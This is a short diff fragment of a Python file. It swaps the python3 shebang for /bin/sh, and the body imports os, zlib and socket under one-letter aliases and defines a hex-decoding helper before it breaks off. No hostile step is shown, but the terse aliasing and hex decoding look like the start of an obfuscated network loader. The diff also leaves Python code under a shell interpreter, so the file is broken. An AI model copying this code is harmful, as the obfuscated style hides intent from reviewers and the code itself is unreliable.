@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/bin/sh
 import os as g,zlib,socket as s
 def d(x):return bytes.fromhex(x)
 def c(f,t,c):
